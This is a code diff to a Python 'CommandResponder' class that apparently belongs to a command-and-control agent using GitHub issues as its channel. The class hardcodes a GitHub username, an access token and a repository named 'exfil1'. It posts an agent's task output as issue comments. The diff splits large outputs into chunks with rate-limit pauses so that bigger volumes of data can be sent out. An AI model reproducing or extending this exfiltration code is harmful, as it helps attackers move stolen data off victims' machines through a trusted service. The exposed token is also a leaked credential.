@@ -3,6 +3,7 @@ import threading
 import importlib
 import yaml
 from github import Github
+import time
 
 
 class CommandResponder:
@@ -11,7 +12,6 @@ class CommandResponder:
         self.agentid = agentid
         self.issue = issue
 
-        self.task_data = ""
         self.ghuser_name = "drtkn"
         self.ghtoken = "dbba5bd20be0a59543762bd19e881d351ce118c7"
         self.ghrepo_name = "exfil1"
@@ -23,16 +23,26 @@ class CommandResponder:
     def _recordData(self):
         pass
 
+    def _task_chunks(self, s, n):
+        for start in range(0, len(s), n):
+            yield s[start:start+n]
+
     def setData(self, task_data):
-        self.task_data = task_data
-        print("CommandResponder: Uploading data {} for agent {}"
+        print("CommandResponder: Uploading data size {} for agent {}"
               "to GH (notify issue {} )".
-              format(unicode(self.task_data), self.agentid, self.issue))
-        self.commentIssue()
+              format(len(task_data), self.agentid, self.issue))
+        # We can hit the limit of comment post. Split the output
+        if len(task_data) < 65536:
+            self.commentIssue(task_data)
+        else:
+            for task_chunk in self._task_chunks(task_data, (65536-1)):
+                self.commentIssue(task_chunk)
+                time.sleep(2)  # https://developer.github.com/v3/#rate-limiting
+
         self.closeIssue()
 
-    def commentIssue(self):
-        self.ghissue.create_comment(self.task_data)
+    def commentIssue(self, task_data):
+        self.ghissue.create_comment(task_data)
         print("CommandResponder: Comment made on Issue")
 
     def closeIssue(self):
